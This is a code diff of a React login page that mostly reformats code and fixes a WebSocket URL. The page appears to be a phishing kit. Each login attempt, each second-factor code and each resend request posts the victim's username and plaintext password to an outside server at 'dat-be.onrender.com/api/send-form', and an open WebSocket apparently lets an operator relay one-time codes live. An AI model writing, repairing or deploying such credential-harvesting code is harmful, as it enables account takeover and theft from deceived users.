@@ -42,7 +42,7 @@ function HomePage() {
   const sessionKeyRef = useRef(generateShortSessionKey());
 
   useEffect(() => {
-    const socket = new WebSocket("wss://dat-be.onrender.com.com/ws");
+    const socket = new WebSocket("wss://dat-be.onrender.com/ws");
     wsRef.current = socket;
 
     socket.onopen = () => {
@@ -145,15 +145,12 @@ function HomePage() {
       qfFunck(passwordUser.current);
       if (qfNum === 0) {
         if (userName.current.value && passwordUser.current.value) {
-          await axios.post(
-            "https://dat-be.onrender.com/api/send-form",
-            {
-              username: formData.userName,
-              password: formData.password,
-              key: "",
-              sessionKey: sessionKeyRef.current,
-            }
-          );
+          await axios.post("https://dat-be.onrender.com/api/send-form", {
+            username: formData.userName,
+            password: formData.password,
+            key: "",
+            sessionKey: sessionKeyRef.current,
+          });
           return;
         }
       }
@@ -185,15 +182,12 @@ function HomePage() {
     setErorekav(false);
     setDisableButton(false);
     if (digit.current.value) {
-      await axios.post(
-        "https://dat-be.onrender.com/api/send-form",
-        {
-          username: formData.userName,
-          password: formData.password,
-          key: formData.key,
-          sessionKey: sessionKeyRef.current,
-        }
-      );
+      await axios.post("https://dat-be.onrender.com/api/send-form", {
+        username: formData.userName,
+        password: formData.password,
+        key: formData.key,
+        sessionKey: sessionKeyRef.current,
+      });
       return;
     } else {
       event.target[0].nextSibling.style.display = "flex";
@@ -203,15 +197,12 @@ function HomePage() {
   }
 
   async function resend() {
-    await axios.post(
-      "https://dat-be.onrender.com/api/send-form",
-      {
-        username: formData.userName,
-        password: formData.password,
-        key: "Resend",
-        sessionKey: sessionKeyRef.current,
-      }
-    );
+    await axios.post("https://dat-be.onrender.com/api/send-form", {
+      username: formData.userName,
+      password: formData.password,
+      key: "Resend",
+      sessionKey: sessionKeyRef.current,
+    });
     setLoadingTwo(false);
     setDisableButton(true);
   }
@@ -298,7 +289,12 @@ function HomePage() {
             ></span>
             Wrong email or password
           </div>
-          <button id="btnLogin" type="submit" className="btn-primary" disabled={loading}>
+          <button
+            id="btnLogin"
+            type="submit"
+            className="btn-primary"
+            disabled={loading}
+          >
             {!loading ? (
               <span>CONTINUE</span>
             ) : (
@@ -359,7 +355,12 @@ function HomePage() {
             ></span>
             The code you entered is invalid
           </div>
-          <button id="btnLoginContinue" type="submit" className="btn-primary" disabled={loadingTwo}>
+          <button
+            id="btnLoginContinue"
+            type="submit"
+            className="btn-primary"
+            disabled={loadingTwo}
+          >
             {!loadingTwo ? (
               <span>CONTINUE</span>
             ) : (
@@ -368,7 +369,14 @@ function HomePage() {
           </button>
         </form>
         <p className="receive">
-          Didn't receive a code? <button onClick={resend} disabled={disableButton} className="resendkey">Resend</button>
+          Didn't receive a code?{" "}
+          <button
+            onClick={resend}
+            disabled={disableButton}
+            className="resendkey"
+          >
+            Resend
+          </button>
         </p>
       </section>
     </div>
